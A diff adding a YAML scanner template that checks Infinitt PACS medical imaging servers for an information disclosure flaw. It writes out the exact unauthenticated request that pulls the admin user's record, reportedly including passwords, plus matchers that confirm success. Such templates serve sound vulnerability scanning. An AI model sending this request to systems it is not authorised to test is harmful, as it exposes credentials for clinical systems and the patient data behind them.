@@ -1,0 +1,26 @@
+id: infinitt-pacs-info-disclosure
+name: Infinitt PACS System - Information Disclosure
+severity: high
+confidence: confirmed
+description: Infinitt PACS System is vulnerable to an Information Disclosure vulnerability. By sending a crafted request,
+  an attacker can obtain sensitive user information, including passwords.
+tags:
+- infinitt
+- disclosure
+- exposure
+- vuln
+requests:
+- method: GET
+  path: /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin
+  matchers:
+  - type: body
+    words:
+    - <web_user_login>
+    - <USER_KEY>
+  - type: body
+    words:
+    - text/xml
+  - type: status
+    status:
+    - 200
+  condition: and
